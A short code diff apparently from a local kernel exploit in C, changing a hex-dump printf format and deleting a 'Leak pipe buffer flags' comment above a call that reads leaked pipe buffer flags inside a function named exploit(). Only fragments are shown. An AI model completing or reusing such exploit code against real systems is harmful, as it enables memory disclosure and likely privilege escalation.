@@ -55,7 +55,7 @@ static void dump_u64(const uint64_t *buffer, size_t size)
     size_t count = size / sizeof(*buffer);
 
     for (size_t i = 0; i + 1 < count; i += 2) {
-        printf("0x%016" PRIx64 "\t0x%016" PRIx64 "\n",
+        printf("0x%016llx \t 0x%016llx\n",
                buffer[i],
                buffer[i + 1]);
     }
@@ -161,8 +161,6 @@ static void exploit(void)
                 nread);
         exit(EXIT_FAILURE);
     }
-
-    /* Leak pipe buffer flags */
     uint64_t flags =
         show_rule(0, 0, RULE_DATA_SIZE);
 
